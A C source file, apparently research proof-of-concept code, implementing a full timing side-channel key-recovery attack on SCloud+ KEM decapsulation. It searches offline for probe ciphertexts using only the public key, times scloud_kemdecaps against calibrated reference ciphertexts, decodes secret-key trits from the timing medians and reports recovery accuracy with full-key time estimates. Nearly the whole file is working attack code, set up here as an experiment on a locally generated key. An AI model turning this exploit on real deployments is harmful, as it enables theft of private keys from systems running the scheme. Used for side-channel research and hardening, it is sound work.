/* TRUE END-TO-END physical recovery (pk-only probes + wall-clock bucket read).
 *
 * Combines the two verified pieces:
 *   (1) OFFLINE pk-only probe search (recover_persearch.c): for each output
 *       coordinate i find a probe (a, v[], delta) that is decode-ROBUST (audit:
 *       key-independent) AND 3-way DISCRIMINATING under THIS key's bucket labels
 *       (profile_message(pke_pk,.)). Pure pk, no secret.
 *   (2) PHYSICAL bucket read: instead of the instrumented sampler bucket, each
 *       probe's bucket is classified from REAL scloud_kemdecaps timing, exactly
 *       what a remote/blind attacker sees. Interleaved-paired against a known-
 *       bucket C1=0 reference (common-mode cancels); median > gap/2 => bucket 54.
 *
 * Trit decode: the s in {-1,0,+1} whose offline-predicted (base,shift) bucket
 * code matches the two TIMED buckets.
 *
 * Reports, separately:
 *   CHANNEL  : timed bucket == noiseless-predicted bucket (pure measurement)
 *   RECOVERY : decoded trit == true secret trit (end-to-end)
 *
 * Args: [key_seed] [positions_per_coord] [N_shots] [N_cal] [max_tries] [coords]
 *   coords: number of coordinates 0..coords-1 to attack (default all 11)
 */
#define main recover_demo_unused_main
#include "recover_demo.c"
#undef main
#include <time.h>

/* ----- offline pk-only prediction & search (from recover_persearch.c) ----- */
static size_t off_bucket(const uint8_t *pke_pk, const uint16_t *v,
                         unsigned target, unsigned a, int s)
{
    uint16_t d[(size_t)scloudplus_mbar * scloudplus_nbar] = {0};
    memcpy(d, v, sizeof(uint16_t) * scloudplus_nbar);
    d[target] = (uint16_t)((int)v[target] - (int)a * s) & scloudplus_q_mask;
    uint8_t mu[scloudplus_ss];
    msg_decode(d, mu);
    size_t b, r; profile_message(pke_pk, mu, &b, &r);
    return b;
}

static int robust_ok(const uint16_t *v, unsigned i, unsigned a)
{
    uint16_t d[(size_t)scloudplus_mbar * scloudplus_nbar] = {0};
    uint8_t m0[scloudplus_ss], mt[scloudplus_ss];
    memcpy(d, v, sizeof(uint16_t) * scloudplus_nbar);
    msg_decode(d, m0);
    for (unsigned j = 0; j < scloudplus_nbar; j++) {
        if (j == i) continue;
        for (int t = -1; t <= 1; t += 2) {
            uint16_t d2[(size_t)scloudplus_mbar * scloudplus_nbar] = {0};
            memcpy(d2, v, sizeof(uint16_t) * scloudplus_nbar);
            d2[j] = (uint16_t)((int)v[j] - (int)a * t) & scloudplus_q_mask;
            msg_decode(d2, mt);
            if (memcmp(m0, mt, scloudplus_ss) != 0) return 0;
        }
    }
    return 1;
}

typedef struct {
    unsigned a; int delta; uint16_t v[scloudplus_nbar];
    size_t pb0[3], pb1[3];      /* predicted base/shift buckets for s=-1,0,+1 */
    unsigned tries; int found;
} probe_t;

static probe_t search_probe(const uint8_t *pke_pk, unsigned i, unsigned max_tries)
{
    probe_t p; memset(&p, 0, sizeof(p));
    for (unsigned t = 1; t <= max_tries; t++) {
        static const unsigned amenu[] = {1,2,4,8,16};
        unsigned a = amenu[xr() % 5];
        int delta = ((int)(xr() % 2) ? +1 : -1);
        uint16_t v[scloudplus_nbar], vs[scloudplus_nbar];
        for (unsigned j = 0; j < scloudplus_nbar; j++)
            v[j] = (uint16_t)(((xr() % 16u) * 64u) & scloudplus_q_mask);
        memcpy(vs, v, sizeof(vs));
        vs[i] = (uint16_t)((vs[i] + delta + scloudplus_q) & scloudplus_q_mask);
        if (!robust_ok(v, i, a) || !robust_ok(vs, i, a)) continue;
        size_t b0[3], b1[3];
        for (int s = -1; s <= 1; s++) {
            b0[s+1] = off_bucket(pke_pk, v,  i, a, s);
            b1[s+1] = off_bucket(pke_pk, vs, i, a, s);
        }
        int d01 = (b0[0]!=b0[1]) || (b1[0]!=b1[1]);
        int d02 = (b0[0]!=b0[2]) || (b1[0]!=b1[2]);
        int d12 = (b0[1]!=b0[2]) || (b1[1]!=b1[2]);
        if (d01 && d02 && d12) {
            p.a=a; p.delta=delta; p.tries=t; p.found=1;
            memcpy(p.v, v, sizeof(v));
            memcpy(p.pb0, b0, sizeof(b0)); memcpy(p.pb1, b1, sizeof(b1));
            return p;
        }
    }
    p.tries = max_tries; p.found = 0; return p;
}

/* ----------------------- physical timing bucket read ----------------------- */
static clockid_t CLK = CLOCK_MONOTONIC_RAW;
static uint64_t mono_ns(void){ struct timespec t; clock_gettime(CLK,&t);
    return (uint64_t)t.tv_sec*1000000000ULL + (uint64_t)t.tv_nsec; }
static volatile uint8_t sink;
static double time_decaps(const uint8_t*sk,const uint8_t*ct){ uint8_t ss[scloudplus_ss];
    uint64_t a=mono_ns(); scloud_kemdecaps(sk,ct,ss); uint64_t b=mono_ns();
    sink^=ss[0]; return (double)(b-a); }
static int cmpd(const void*a,const void*b){ double x=*(const double*)a,y=*(const double*)b; return (x>y)-(x<y);}
static double med(double*x,unsigned n){ qsort(x,n,sizeof(double),cmpd);
    return n&1?x[n/2]:0.5*(x[n/2-1]+x[n/2]); }

static void build_probe_ct(const uint16_t *v, unsigned k, unsigned a, uint8_t *ct){
    uint16_t c1[(size_t)scloudplus_mbar*scloudplus_n]={0};
    uint16_t c2[(size_t)scloudplus_mbar*scloudplus_nbar]={0};
    c1[k]=(uint16_t)a; memcpy(c2,v,sizeof(v[0])*scloudplus_nbar);
    pack_c1(c1,ct); pack_c2(c2,ct+scloudplus_c1);
}
static void build_ref_ct(const uint8_t*m,uint8_t*ct){
    uint16_t c1[(size_t)scloudplus_mbar*scloudplus_n]={0};
    uint16_t c2[(size_t)scloudplus_mbar*scloudplus_nbar];
    msg_encode(m,c2); pack_c1(c1,ct); pack_c2(c2,ct+scloudplus_c1);
}
/* interleaved-paired classification vs the bucket-53 reference */
static size_t timed_bucket(const uint8_t*sk,const uint8_t*ctp,const uint8_t*ctref_lo,
                           double thr,unsigned N,double*d){
    for(unsigned i=0;i<N;i++){ double tp,tr;
        if(xr()&1){tp=time_decaps(sk,ctp);tr=time_decaps(sk,ctref_lo);}
        else      {tr=time_decaps(sk,ctref_lo);tp=time_decaps(sk,ctp);}
        d[i]=tp-tr; }
    return med(d,N) > thr ? 54 : 53;
}
/* noiseless instrumented bucket, for the CHANNEL comparison */
static size_t real_bucket(const uint8_t*sk,const uint16_t*v,unsigned k,unsigned a){
    uint8_t ct[scloudplus_ctx],ss[scloudplus_ss];
    build_probe_ct(v,k,a,ct);
    generated_bytes=0; if(scloud_kemdecaps(sk,ct,ss)!=0) exit(3);
    return generated_bytes/544;
}

int main(int argc,char**argv){
    if(argc>1) krng=strtoull(argv[1],0,10)|1ULL;
    const unsigned per_coord=argc>2?(unsigned)strtoul(argv[2],0,10):4U;
    const unsigned N        =argc>3?(unsigned)strtoul(argv[3],0,10):400U;
    const unsigned Ncal     =argc>4?(unsigned)strtoul(argv[4],0,10):3000U;
    const unsigned max_tries=argc>5?(unsigned)strtoul(argv[5],0,10):300000U;
    const unsigned ncoord   =argc>6?(unsigned)strtoul(argv[6],0,10):scloudplus_nbar;
    /* argv[7]: clock 0=MONOTONIC (plain/naive) 1=MONOTONIC_RAW (default) */
    if(argc>7 && strtoul(argv[7],0,10)==0) CLK=CLOCK_MONOTONIC;
    fprintf(stderr,"clock=%s\n",CLK==CLOCK_MONOTONIC_RAW?"MONOTONIC_RAW":"MONOTONIC");

    uint8_t pk[scloudplus_pk],sk[scloudplus_kem_sk];
    if(scloud_kemkeygen(pk,sk))return 1;
    const uint8_t*pke_pk=sk+scloudplus_pke_sk;
    uint16_t S[(size_t)scloudplus_n*scloudplus_nbar]; unpack_sk(sk,S);
    memo=calloc(MEMO_SLOTS,sizeof(*memo)); if(!memo)return 1;

    /* ---- OFFLINE pk-only probe search ---- */
    fprintf(stderr,"OFFLINE pk-only probe search (%u coords):\n",ncoord);
    probe_t pr[scloudplus_nbar];
    for(unsigned i=0;i<ncoord;i++){
        pr[i]=search_probe(pke_pk,i,max_tries);
        fprintf(stderr,"  coord %2u: %s a=%2u delta=%+d after %u tries\n",
                i,pr[i].found?"FOUND":"FAIL ",pr[i].a,pr[i].delta,pr[i].tries);
    }

    /* ---- known-bucket references (pk-only): bucket 53 and 54, C1=0 ---- */
    uint8_t m_lo[scloudplus_ss]={0},m_hi[scloudplus_ss]={0}; int hl=0,hh=0;
    for(unsigned c=0;c<200000&&!(hl&&hh);c++){ uint8_t m[scloudplus_ss]={0};
        for(unsigned j=0;j<8;j++)m[j]=(uint8_t)(c>>(8*j));
        size_t b,r; profile_message(pke_pk,m,&b,&r);
        if(b==53&&!hl){memcpy(m_lo,m,sizeof(m));hl=1;}
        if(b==54&&!hh){memcpy(m_hi,m,sizeof(m));hh=1;} }
    if(!hl||!hh){fprintf(stderr,"no refs\n");return 2;}
    uint8_t ct_lo[scloudplus_ctx],ct_hi[scloudplus_ctx];
    build_ref_ct(m_lo,ct_lo); build_ref_ct(m_hi,ct_hi);

    /* warmup + calibrate gap/threshold from the two refs */
    for(unsigned i=0;i<300;i++){(void)time_decaps(sk,ct_lo);(void)time_decaps(sk,ct_hi);}
    double*cal=malloc(sizeof(double)*Ncal);
    for(unsigned i=0;i<Ncal;i++){ double thi,tlo;
        if(xr()&1){thi=time_decaps(sk,ct_hi);tlo=time_decaps(sk,ct_lo);}
        else      {tlo=time_decaps(sk,ct_lo);thi=time_decaps(sk,ct_hi);}
        cal[i]=thi-tlo; }
    double gap=med(cal,Ncal), thr=gap/2.0; free(cal);
    fprintf(stderr,"calibrated gap=%.1f ns threshold=%.1f ns (Ncal=%u, N_shots=%u)\n",
            gap,thr,Ncal,N);

    /* ---- ONLINE physical recovery ---- */
    /* ---- ONLINE: measure N shots ONCE per probe-ct, then evaluate accuracy at
     * prefixes N' <= N. One measurement pass yields the whole N-sweep, and the
     * expensive offline search runs only once. db/ds hold the per-shot diffs
     * (probe - ref_lo) in measurement order; prefix medians subsample them. */
    const unsigned NSW[] = {25,50,100,200,400,800,1600};
    const unsigned nsw = sizeof(NSW)/sizeof(NSW[0]);
    unsigned nsw_use=0; for(unsigned s=0;s<nsw;s++) if(NSW[s]<=N) nsw_use=s+1;
    double*db=malloc(sizeof(double)*N),*ds=malloc(sizeof(double)*N);
    unsigned long tot=0;
    unsigned long ch_ok[16]={0},rec_ok[16]={0},nz=0,nz_ok[16]={0};
    unsigned step=scloudplus_n/per_coord; if(!step)step=1;
    uint64_t w0=mono_ns();
    printf("coord,position,true,nb_base,nb_shift");
    for(unsigned s=0;s<nsw_use;s++) printf(",rec@N%u",NSW[s]);
    printf("\n");
    for(unsigned i=0;i<ncoord;i++){
        if(!pr[i].found) continue;
        probe_t*p=&pr[i];
        uint16_t vs[scloudplus_nbar]; memcpy(vs,p->v,sizeof(vs));
        vs[i]=(uint16_t)((vs[i]+p->delta+scloudplus_q)&scloudplus_q_mask);
        for(unsigned k=0;k<scloudplus_n;k+=step){
            uint8_t ctb[scloudplus_ctx],cts[scloudplus_ctx];
            build_probe_ct(p->v,k,p->a,ctb); build_probe_ct(vs,k,p->a,cts);
            for(unsigned t=0;t<N;t++){ double tp,tr;
                if(xr()&1){tp=time_decaps(sk,ctb);tr=time_decaps(sk,ct_lo);}
                else      {tr=time_decaps(sk,ct_lo);tp=time_decaps(sk,ctb);}
                db[t]=tp-tr; }
            for(unsigned t=0;t<N;t++){ double tp,tr;
                if(xr()&1){tp=time_decaps(sk,cts);tr=time_decaps(sk,ct_lo);}
                else      {tr=time_decaps(sk,ct_lo);tp=time_decaps(sk,cts);}
                ds[t]=tp-tr; }
            size_t nb=real_bucket(sk,p->v,k,p->a), ns=real_bucket(sk,vs,k,p->a);
            int tv=center(S[(size_t)i*scloudplus_n+k]);
            tot++; if(tv)nz++;
            printf("%u,%u,%d,%zu,%zu",i,k,tv,nb,ns);
            double*tmp=malloc(sizeof(double)*N);
            for(unsigned s=0;s<nsw_use;s++){
                unsigned Np=NSW[s];
                memcpy(tmp,db,sizeof(double)*Np); double mb=med(tmp,Np);
                memcpy(tmp,ds,sizeof(double)*Np); double ms=med(tmp,Np);
                size_t tb=mb>thr?54:53, ts=ms>thr?54:53;
                int guess=99;
                for(int g=-1;g<=1;g++) if(p->pb0[g+1]==tb&&p->pb1[g+1]==ts) guess=g;
                int ch=(tb==nb)&&(ts==ns), rec=(guess==tv);
                ch_ok[s]+=ch; rec_ok[s]+=rec; if(tv)nz_ok[s]+=rec;
                printf(",%d",rec);
            }
            free(tmp);
            printf("\n"); fflush(stdout);
        }
    }
    double wall=(double)(mono_ns()-w0)/1e9;
    double per_decaps_s = tot? wall/(double)(tot*((size_t)N*2+2)) : 0;
    fprintf(stderr,"\nN-sweep (coeffs=%lu, baseline all-zero=%.1f%%):\n",
            tot,tot?100.0*(tot-nz)/tot:0);
    fprintf(stderr,"  %6s %8s %8s %10s %10s\n","N","CHANNEL","RECOVER","s/coef","full(d)");
    for(unsigned s=0;s<nsw_use;s++){
        double scoef = (double)NSW[s]*4*per_decaps_s;
        fprintf(stderr,"  %6u %7.1f%% %7.1f%% %9.2fs %9.2f\n",
                NSW[s],100.0*ch_ok[s]/tot,100.0*rec_ok[s]/tot,
                scoef, scoef*13024/86400.0);
    }
    fprintf(stderr,"per-decaps ~= %.3f ms; wall %.1fs (measured at N=%u)\n",
            per_decaps_s*1e3,wall,N);
    free(db);free(ds);free(memo); return 0;
}
